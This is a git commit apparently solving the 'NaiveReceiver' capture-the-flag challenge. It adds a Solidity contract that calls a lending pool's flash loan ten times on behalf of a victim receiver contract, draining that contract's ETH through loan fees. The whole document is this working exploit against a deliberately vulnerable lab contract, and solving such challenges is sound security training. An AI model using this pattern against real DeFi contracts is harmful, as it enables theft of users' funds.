5601a853c159be1ce10798c0fae748dc258eaff5
Hrik Bhowal <hrik.bhowal@gmail.com>
2023-02-16 20:41:02 -0800

    NaiveReceiver

---
+++ contracts/naive-receiver/DrainReceiver.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "./FlashLoanReceiver.sol";
+import "./NaiveReceiverLenderPool.sol";
+
+contract DrainReceiver {
+    NaiveReceiverLenderPool private pool;
+    FlashLoanReceiver private reciever;
+    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+
+    constructor(NaiveReceiverLenderPool _pool, FlashLoanReceiver _reciever) {
+        pool = _pool;
+        reciever = _reciever;
+    }
+
+    function drain() external {
+        for (uint256 i = 0; i < 10; i++) pool.flashLoan(reciever, ETH, 0, "");
+    }
+
+    receive() external payable {}
+}
